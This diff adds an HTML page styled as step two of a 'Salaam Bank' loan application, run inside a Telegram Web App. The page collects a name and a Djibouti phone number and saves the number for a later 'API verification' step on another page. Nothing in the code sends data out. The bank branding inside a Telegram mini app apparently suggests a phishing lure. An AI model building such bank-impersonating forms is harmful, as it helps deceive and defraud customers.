@@ -1,0 +1,268 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Demande de Prêt - Étape 2 | Salaam Bank</title>
+
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: #0066b2; /* Salaam Bank Logo Blue */
+            margin: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            color: #333333;
+            min-height: 100vh;
+        }
+
+        .nav-header {
+            width: 100%;
+            background-color: #005291; /* Darker Blue Header */
+            padding: 18px 20px;
+            color: #ffffff;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            box-sizing: border-box;
+        }
+
+        .bank-logo {
+            font-size: 22px;
+            font-weight: bold;
+        }
+
+        .form-card {
+            background: #ffffff; /* Clean White Card */
+            width: 92%;
+            max-width: 480px;
+            margin-top: 20px;
+            padding: 30px 20px;
+            border-radius: 16px;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.15);
+            box-sizing: border-box;
+        }
+
+        .progress-box {
+            display: flex;
+            gap: 8px;
+            margin-bottom: 35px;
+        }
+
+        .bar {
+            height: 6px;
+            flex: 1;
+            background: #e2e8f0;
+            border-radius: 3px;
+        }
+
+        .active-bar {
+            background: #008744; /* Salaam Bank Logo Green Highlight */
+        }
+
+        .input-wrap {
+            margin-bottom: 25px;
+        }
+
+        label {
+            display: block;
+            font-size: 15px;
+            font-weight: 600;
+            margin-bottom: 8px;
+            color: #444444;
+        }
+
+        input {
+            width: 100%;
+            padding: 14px;
+            border: 1px solid #cbd5e1;
+            border-radius: 8px;
+            font-size: 16px;
+            box-sizing: border-box;
+            background-color: #ffffff;
+            color: #333333;
+            outline: none;
+        }
+
+        input:focus {
+            border-color: #0066b2;
+        }
+
+        input::placeholder {
+            color: #94a3b8;
+        }
+
+        .phone-container {
+            display: flex;
+            gap: 10px;
+        }
+
+        .country-code {
+            width: 85px;
+            background: #f1f5f9;
+            text-align: center;
+            font-weight: bold;
+            border: 1px solid #cbd5e1;
+            line-height: 48px;
+            color: #0066b2;
+            border-radius: 8px;
+            font-size: 16px;
+        }
+
+        .phone-input {
+            flex: 1;
+        }
+
+        .phone-hint {
+            font-size: 13px;
+            color: #666666;
+            margin-top: 8px;
+        }
+
+        .btn-container {
+            margin-top: 35px;
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+
+        .back-btn {
+            background-color: #f1f5f9;
+            color: #475569;
+            border: 1px solid #cbd5e1;
+            width: 100%;
+            padding: 16px;
+            border-radius: 10px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            text-transform: uppercase;
+        }
+
+        .next-btn {
+            background-color: #008744; /* Salaam Bank Logo Green */
+            color: #ffffff;
+            border: none;
+            width: 100%;
+            padding: 18px;
+            border-radius: 10px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            text-transform: uppercase;
+            transition: background-color 0.2s ease;
+        }
+
+        .next-btn:hover {
+            background-color: #006e37;
+        }
+
+        .next-btn:active {
+            background-color: #00542a;
+        }
+
+        .footer-text {
+            text-align: center;
+            font-size: 12px;
+            color: rgba(255, 255, 255, 0.8);
+            margin: 40px 0 30px;
+        }
+    </style>
+</head>
+
+<body>
+
+<div class="nav-header">
+    <div onclick="goBack()" style="cursor:pointer; font-size:18px; color: #ffffff;">← Retour</div>
+    <div class="bank-logo">Salaam Bank</div>
+    <div style="font-size: 24px;">☰</div>
+</div>
+
+<div class="form-card">
+    <div class="progress-box">
+        <div class="bar active-bar"></div>
+        <div class="bar active-bar"></div>
+        <div class="bar"></div>
+    </div>
+
+    <div class="input-wrap">
+        <label>Prénom</label>
+        <input type="text" id="firstName" placeholder="Exemple: Ahmed">
+    </div>
+
+    <div class="input-wrap">
+        <label>Nom de famille</label>
+        <input type="text" id="lastName" placeholder="Exemple: Ali">
+    </div>
+
+    <div class="input-wrap">
+        <label>Numéro de téléphone</label>
+        <div class="phone-container">
+            <div class="country-code">+253</div>
+            <input type="tel" id="phone" class="phone-input" placeholder="77XXXXXX" maxlength="8">
+        </div>
+        <p class="phone-hint">Entrez un numéro valide à 8 chiffres (exemple: 77123456)</p>
+    </div>
+
+    <div class="btn-container">
+        <button type="button" class="next-btn" onclick="goNext()">ÉTAPE SUIVANTE</button>
+        <button type="button" class="back-btn" onclick="goBack()">RETOUR</button>
+    </div>
+</div>
+
+<div class="footer-text">© 2026 Salaam Bank. Tous droits réservés.</div>
+
+<script>
+    function goNext() {
+        const fName = document.getElementById('firstName').value.trim();
+        const lName = document.getElementById('lastName').value.trim();
+        const phone = document.getElementById('phone').value.trim();
+
+        if (!fName || !lName || !phone) {
+            alert("Veuillez remplir tous les champs.");
+            return;
+        }
+
+        if (!/^\d{8}$/.test(phone)) {
+            alert("Veuillez entrer un numéro de téléphone valide.");
+            return;
+        }
+
+        // Save for general flow
+        localStorage.setItem('firstName', fName);
+        localStorage.setItem('lastName', lName);
+        localStorage.setItem('phone', phone);
+        
+        // CRITICAL: Save specifically for the API verification
+        localStorage.setItem('userPhone', phone);
+
+        window.location.href = "/page4";
+    }
+
+    function goBack() {
+        window.location.href = "/page2";
+    }
+
+    window.onload = () => {
+        const tg = window.Telegram?.WebApp;
+        if (tg) {
+            tg.ready();
+            tg.expand();
+        }
+
+        // Auto-fill existing data
+        const f = localStorage.getItem('firstName');
+        const l = localStorage.getItem('lastName');
+        const p = localStorage.getItem('phone');
+
+        if (f) document.getElementById('firstName').value = f;
+        if (l) document.getElementById('lastName').value = l;
+        if (p) document.getElementById('phone').value = p;
+    };
+</script>
+
+</body>
+</html>
